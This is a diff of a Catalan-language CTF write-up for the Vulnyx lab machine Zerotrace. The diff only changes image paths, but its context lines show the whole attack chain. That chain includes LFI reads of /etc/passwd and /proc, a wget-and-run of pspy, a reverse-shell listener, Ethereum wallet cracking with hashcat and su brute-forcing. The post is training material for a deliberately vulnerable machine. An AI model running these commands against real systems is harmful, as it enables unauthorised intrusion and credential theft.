@@ -5,7 +5,7 @@ title: WriteUp Zerotrace - Vulnyx
 slug: zerotrace-writeup-vulnyx-ca
 featured: false
 draft: false
-ogImage: "assets/zerotrace/OpenGraph.png"
+ogImage: "../../../assets/images/zerotrace/OpenGraph.png"
 tags:
     - Vulnyx
     - LFI
@@ -17,7 +17,7 @@ description:
 lang: ca
 ---
 
-![VBox](/assets/zerotrace/vbox.png)
+![VBox](../../../assets/images/zerotrace/vbox.png)
 
 En aquest writeup es descriu la resolució de la màquina **Zerotrace** creada per [suraxddq](https://byte-mind.net/). És el primer writeup del meu blog que no pertany a una màquina creada per mi. Espero que us serveixi d'ajuda.
 
@@ -33,7 +33,7 @@ Escanegem ràpidament tots els ports amb nmap.
 nmap -p- -Pn -n -sS 192.168.1.187
 ```
 
-![Nmap all ports](/assets/zerotrace/nmap1.png)
+![Nmap all ports](../../../assets/images/zerotrace/nmap1.png)
 
 Observem tres ports oberts: 22, 80 i 8000. Realitzem un escaneig més detallat per identificar els serveis, versions i possibles vectors d'atac utilitzant els scripts de nmap.
 
@@ -41,7 +41,7 @@ Observem tres ports oberts: 22, 80 i 8000. Realitzem un escaneig més detallat p
 nmap -p22,80,8000 -sVC -Pn -n 192.168.1.187 -o nmap.txt
 ```
 
-![Nmap](/assets/zerotrace/nmap2.png)
+![Nmap](../../../assets/images/zerotrace/nmap2.png)
 
 Podem observar que el sistema operatiu és un `Debian`, el port **22** correspon al servei `SSH` amb `OpenSSH`, el port **80** allotja un lloc web `http` amb `nginx` i el port **8000** sembla ser un servei `FTP` implementat amb `pyftpdlib`. Les versions són actuals i no presenten vulnerabilitats aparents.
 
@@ -63,7 +63,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-med
 
 Després de diversos intents sense èxit, vaig provar diferents tècniques com `HTTP Request smuggling`, vaig analitzar possibles vulnerabilitats en les versions dels serveis i vaig executar el comandament `strings` en l'arxiu OVA, la qual cosa em va permetre descobrir informació rellevant com els usuaris del sistema. Davant la falta de progrés, vaig decidir sol·licitar una pista a suraxddq.
 
-![Discord](/assets/zerotrace/discord.png)
+![Discord](../../../assets/images/zerotrace/discord.png)
 
 Amb la pista "*Y si no lo ves... .*" em va ajudar a continuar. Busquem tots els fitxers i carpetes ocultes que comencen amb punt `.` utilitzant `ffuf`.
 
@@ -71,7 +71,7 @@ Amb la pista "*Y si no lo ves... .*" em va ajudar a continuar. Busquem tots els 
 ffuf -u http://192.168.1.187/.FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "User-Agent: Mozilla/5.0" -fs 153 -t 40
 ```
 
-![FFUF](/assets/zerotrace/ffuf1.png)
+![FFUF](../../../assets/images/zerotrace/ffuf1.png)
 
 Vam trobar la carpeta `/.admin`. Continuem amb el fuzzing dins d'aquesta carpeta.
 
@@ -79,7 +79,7 @@ Vam trobar la carpeta `/.admin`. Continuem amb el fuzzing dins d'aquesta carpeta
 gobuster dir -u http://192.168.1.187/.admin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .pcap,.php,.txt,.zip,.db,.htm,.html,.phar,.db,.sql,.sql.gz,.sql.zip
 ```
 
-![gobuster](/assets/zerotrace/gobuster.png)
+![gobuster](../../../assets/images/zerotrace/gobuster.png)
 
 Vam trobar l'arxiu `/.admin/tool.php`. Com que és un arxiu PHP que no mostra cap contingut (0 caràcters), vam procedir a realitzar fuzzing de paràmetres tant POST com GET per descobrir possibles vectors d'entrada.
 
@@ -89,7 +89,7 @@ Fuzzing de paràmetres POST.
 ffuf -u "http://192.168.1.187/.admin/tool.php" -X POST -d "FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 
-![ffuf-post](/assets/zerotrace/ffuf-post.png)
+![ffuf-post](../../../assets/images/zerotrace/ffuf-post.png)
 
 En no trobar resultats amb el fuzzing de paràmetres POST, vam procedir a realitzar el fuzzing de paràmetres GET.
 
@@ -97,11 +97,11 @@ En no trobar resultats amb el fuzzing de paràmetres POST, vam procedir a realit
 ffuf -u "http://192.168.1.187/.admin/tool.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 
-![ffuf-get](/assets/zerotrace/ffuf-get.png)
+![ffuf-get](../../../assets/images/zerotrace/ffuf-get.png)
 
 Vam trobar el paràmetre `file`. En accedir a la URL `/.admin/tool.php?file=/etc/passwd` podem veure el contingut de l'arxiu `/etc/passwd` que conté la llista d'usuaris del sistema.
 
-![ffuf-get](/assets/zerotrace/etcpasswd.png)
+![ffuf-get](../../../assets/images/zerotrace/etcpasswd.png)
 
 Utilitzem una [wordlist per a LFI](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/refs/heads/main/LFI-WordList-Linux) de DragonJAR i només podem obtenir els arxius `/etc/passwd` i `/etc/hosts`.
 
@@ -109,9 +109,9 @@ Utilitzem una [wordlist per a LFI](https://raw.githubusercontent.com/DragonJAR/S
 ffuf -u "http://192.168.1.187/.admin/tool.php?file=FUZZ" -w ./LFI-WordList-Linux -fs 0
 ```
 
-![ffuf-get](/assets/zerotrace/ffuf-lfi.png)
+![ffuf-get](../../../assets/images/zerotrace/ffuf-lfi.png)
 
-![ffuf-get](/assets/zerotrace/etc-hosts.png)
+![ffuf-get](../../../assets/images/zerotrace/etc-hosts.png)
 
 Intentem accedir als arxius en el directori `/proc` de Linux, on podem veure els comandos executats pels serveis actius en `/proc/[PID]/cmdline`.
 
@@ -135,7 +135,7 @@ jq -r '.results[].url' cmd-ffuf.txt | xargs -P4 -I {} sh -c 'echo "\n***********
 
 Ara podem observar tots els comandos trobats en el servidor en el fitxer `resultados.txt`.
 
-![resultados.txt](/assets/zerotrace/resultadostxt.png)
+![resultados.txt](../../../assets/images/zerotrace/resultadostxt.png)
 
 Vam trobar el comandament que inicia el servei `FTP` al port `8000`, on s'exposa la contrasenya utilitzada de l'usuari `J4ckie0x17`.
 
@@ -147,7 +147,7 @@ Amb la contrasenya trobada de `J4ckie0x17` podem accedir al servei FTP al port 8
 ssh J4ckie0x17@192.168.1.187
 ```
 
-![ssh J4ckie0x17](/assets/zerotrace/ssh.png)
+![ssh J4ckie0x17](../../../assets/images/zerotrace/ssh.png)
 
 ## Moviment lateral de J4ckie0x17 a shelldredd
 
@@ -159,7 +159,7 @@ Vam trobar diverses coses interessants amb l'usuari `J4ckie0x17`.
 find / -type f -perm -4000 2>/dev/null
 ```
 
-![find suid](/assets/zerotrace/suid.png)
+![find suid](../../../assets/images/zerotrace/suid.png)
 
 2. Utilitzem `pspy` per monitoritzar els processos actius i trobem un que executa l'usuari `shelldredd` amb el `UID` 1003 molt sospitós.
 
@@ -167,7 +167,7 @@ find / -type f -perm -4000 2>/dev/null
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s && chmod +x pspy64s && ./pspy64s
 ```
 
-![shelldredd process](/assets/zerotrace/shelldreddprocess.png)
+![shelldredd process](../../../assets/images/zerotrace/shelldreddprocess.png)
 
 ```raw
 CMD: UID=1003  PID=1475  | /bin/sh -c /bin/bash /opt/.nobodyshouldreadthis/destiny
@@ -179,7 +179,7 @@ En examinar el binari `destiny`, sembla que podem modificar-lo i no conté cap s
 lsattr /opt/.nobodyshouldreadthis/destiny
 ```
 
-![destiny inmutable](/assets/zerotrace/inmutable.png)
+![destiny inmutable](../../../assets/images/zerotrace/inmutable.png)
 
 Utilitzem el binari `chattr` amb permisos SUID per treure el flag d'inmutable.
 
@@ -187,7 +187,7 @@ Utilitzem el binari `chattr` amb permisos SUID per treure el flag d'inmutable.
 chattr -i /opt/.nobodyshouldreadthis/destiny
 ```
 
-![destiny no inmutable](/assets/zerotrace/inmutable2.png)
+![destiny no inmutable](../../../assets/images/zerotrace/inmutable2.png)
 
 Ara podem modificar l'arxiu `destiny`, afegint un shell invers que apunti a la nostra màquina atacant en el port 443.
 
@@ -203,7 +203,7 @@ nc -lvnp 443
 
 Després d'esperar aproximadament un minut, rebem una shell inversa amb privilegis de l'usuari `shelldredd`.
 
-![shell con shelldredd](/assets/zerotrace/shell-shelldredd.png)
+![shell con shelldredd](../../../assets/images/zerotrace/shell-shelldredd.png)
 
 ## Moviment lateral de shelldredd a ll104567
 
@@ -241,7 +241,7 @@ Des del nostre host, copiem els arxius del cryptovault de `ll104567` a la nostra
 scp -r shelldredd@192.168.1.187:/opt/cryptovault/ll104567 .
 ```
 
-![scp vault](/assets/zerotrace/scp-vault.png)
+![scp vault](../../../assets/images/zerotrace/scp-vault.png)
 
 Seguint les tècniques descrites en l'anàlisi de vulnerabilitats en arxius keystore de wallets Ethereum, vam procedir a intentar crackejar la wallet.
 
@@ -253,11 +253,11 @@ Primer hem d'obtenir el hash del wallet utilitzant `ethereum2john`, que farem se
 ethereum2john secret
 ```
 
-![ethereum2john](/assets/zerotrace/ethereum2john.png)
+![ethereum2john](../../../assets/images/zerotrace/ethereum2john.png)
 
 Guardem el `hash` en un fitxer.
 
-![ethereum2john](/assets/zerotrace/hash.png)
+![ethereum2john](../../../assets/images/zerotrace/hash.png)
 
 Procedim a intentar crackejar-lo amb `hashcat`.
 
@@ -271,7 +271,7 @@ Després d'un temps d'espera, hashcat descobreix la contrasenya `dragonballz` qu
 hashcat -m 15700 hash /usr/share/wordlists/rockyou.txt --show
 ```
 
-![wallet pass](/assets/zerotrace/walletpass.png)
+![wallet pass](../../../assets/images/zerotrace/walletpass.png)
 
 ### Contrasenya de ll104567 i diccionari
 
@@ -285,7 +285,7 @@ Al directori home de shelldredd creem un diccionari amb l'arxiu `/home/ll104567/
 sed 's/^/dragonballz/' ../ll104567/one > ~/diccionario.txt
 ```
 
-![Diccionario password](/assets/zerotrace/diccionario.png)
+![Diccionario password](../../../assets/images/zerotrace/diccionario.png)
 
 Descarreguem l'eina `suForce` de d4t4s3c, eina molt útil per fer força bruta.
 
@@ -299,7 +299,7 @@ i la utilitzem amb el diccionari creat per intentar obtenir la contrasenya de l'
 ./suForce -u ll104567 -w ./diccionario.txt
 ```
 
-![suForce](/assets/zerotrace/suforce.png)
+![suForce](../../../assets/images/zerotrace/suforce.png)
 
 Bingo! Obtenim la contrasenya de l'usuari ll104567.
 
@@ -313,7 +313,7 @@ Utilitzant `su` des de l'usuari shelldredd o accedint mitjançant `SSH` amb la c
 su ll104567
 ```
 
-![su](/assets/zerotrace/su.png)
+![su](../../../assets/images/zerotrace/su.png)
 
 L'usuari `ll104567` té permisos per executar com a `root` mitjançant sudo l'executable `/home/ll104567/guessme` que vam analitzar prèviament i era vulnerable.
 
@@ -374,11 +374,11 @@ done
 
 Copiem el codi i creem un fitxer al directori home de l'usuari, li assignem permisos d'execució i l'executem.
 
-![root pass](/assets/zerotrace/rootpass.png)
+![root pass](../../../assets/images/zerotrace/rootpass.png)
 
 Un cop obtinguda la contrasenya de l'usuari `root` mitjançant l'script, utilitzem el comandament `su` per canviar a l'usuari root. Finalment, llegim el contingut del fitxer `root.txt` que conté la flag final del sistema.
 
-![root flag](/assets/zerotrace/rootflag.png)
+![root flag](../../../assets/images/zerotrace/rootflag.png)
 
 Agraeixo a suraxddq per aquesta excel·lent màquina virtual. A través d'aquest laboratori, he adquirit coneixements valuosos sobre la seguretat de les wallets d'Ethereum i les vulnerabilitats associades a la seva implementació.
 
